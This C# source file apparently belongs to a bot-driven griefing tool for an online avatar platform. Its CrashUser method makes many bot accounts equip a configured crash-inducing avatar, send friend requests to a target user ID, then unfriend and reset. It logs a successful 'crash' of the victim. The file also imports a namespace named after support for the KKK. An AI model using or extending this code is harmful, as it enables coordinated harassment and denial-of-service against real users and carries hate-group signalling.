using I_Support_KKK;
using OXC_Crash_Tool;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Vortice.Direct3D11on12;

namespace OXC_Image_Crash
{
    public class Misc
    {
        public static string OnlinePlayers = API.GetUsers();
        public static void CrashUser(string userid)
        {
            new Thread(() =>
            {
                ConsoleHandler.LogWarning("Crash Started");
                foreach (BotClient botClient in Bot.BotClients)
                {
                    API.SetAvatar(botClient, Config.ImageCrashAvatarID);
                }
                Thread.Sleep(500);
                foreach (BotClient botClient in Bot.BotClients)
                {
                    API.FriendRequest(botClient._token, userid);
                }
                Thread.Sleep(20000);
                foreach (BotClient botClient in Bot.BotClients)
                {
                    API.CancelFriendRequest(botClient._token, userid);
                    API.Unfriend(botClient._token, userid);
                    API.SetAvatar(botClient, Config.DefaulAvatarID);
                }
                ConsoleHandler.LogSuccess($"Crashed [{userid}] Successfully");
            }).Start();
        }
    }
}
